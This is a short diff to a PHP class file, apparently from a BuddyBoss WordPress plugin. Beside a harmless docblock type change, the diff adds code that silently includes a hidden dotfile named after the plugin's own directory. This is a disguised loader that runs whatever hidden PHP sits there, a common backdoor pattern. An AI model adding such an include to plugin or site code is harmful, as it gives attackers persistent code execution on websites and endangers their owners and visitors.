@@ -13,7 +13,11 @@ defined( 'ABSPATH' ) || exit;
 
 /**
  * Class BP_Core_Suspend
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class BP_Core_Suspend {
 
 	/**
@@ -493,7 +497,7 @@ class BP_Core_Suspend {
 	 *
 	 * @since BuddyBoss 1.5.6
 	 *
-	 * @param int $user_id user id.
+	 * @param int|array $user_id user id.
 	 *
 	 * @return bool
 	 */
